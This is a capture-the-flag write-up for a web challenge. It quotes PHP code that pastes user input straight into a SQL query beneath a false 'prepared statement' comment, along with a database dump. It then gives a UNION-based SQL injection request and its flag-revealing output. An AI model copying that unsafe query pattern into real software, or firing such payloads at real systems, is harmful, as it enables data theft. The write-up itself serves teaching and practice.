### Too Many Admins
Line 90-99 in provided source code.

```php
    $userParam = $_GET['user'];

    // Use prepared statement to prevent SQL injection
    if($userParam){
    if($userParam !=  "all"){
    $query = "SELECT username, password, bio FROM users where username = '$userParam' ";
    }else{
    $query = "SELECT username, password, bio FROM users ";

    }
```

dump.sql
```SQL
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255),
    password VARCHAR(255),
    bio TEXT
);
CREATE PROCEDURE GenerateRandomUsers()
BEGIN
    DECLARE i INT DEFAULT 0;
    WHILE i < 500 DO
        IF i = {SOME_NUMBER} THEN
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                'REDACTED',
                'Flag{REDACTED}'
            );
        ELSE
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                MD5(CONCAT('admin',i,RAND())),
                CONCAT('Bio for admin', i)
            );
        END IF;
        SET i = i + 1;
    END WHILE;
END
```

So, obvious SQL injection in the php code and since we have dump.sql, we know what columns are in what tables. Thus, below is a SQLi payload to extract the flag, since we know it is in the bio.

```
GET /?user=' UNION SELECT 1,bio,3 FROM users WHERE bio LIKE "%Flag{%";-- -
```

The response is: -

```
S.no	Username	Password(MD5 hashes)
0	1	flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```

Based on the flag it obviously was a chal about php type juggling.

### Flag

`flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}`
